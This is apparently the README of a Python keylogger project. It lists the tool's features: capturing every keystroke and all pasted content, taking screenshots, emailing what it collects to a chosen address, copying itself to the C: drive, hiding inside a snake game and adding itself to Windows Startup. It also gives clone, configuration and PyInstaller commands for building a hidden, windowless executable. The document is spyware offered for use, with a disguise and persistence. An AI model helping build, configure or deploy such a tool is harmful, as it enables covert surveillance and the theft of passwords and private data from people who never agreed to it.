# An advanced keylogger implemented in Python
## Features:
- Record the output of the full keyboard
- Also record the content of the paste action
- Take a screenshot every time user switch between windows
- Packaged and collected information sent to a specified email address
- It will copy itself to the C: drive
- Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
- Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
## Usage
Quick start
1. git clone https://github.com/secureyourself7/python-keylogger
2. cd python-keylogger
Customize parameters in Start.py: url_server_upload, hidden_service_check_connection.
Run as a Python script
pip install requirements.txt (alternatively python -m pip ...)
python Start.py
Run as an executable (7 MB)
pip install pyinstaller
pyinstaller --onefile --noconsole --icon=icon.ico Start.py
dist\Start.exe
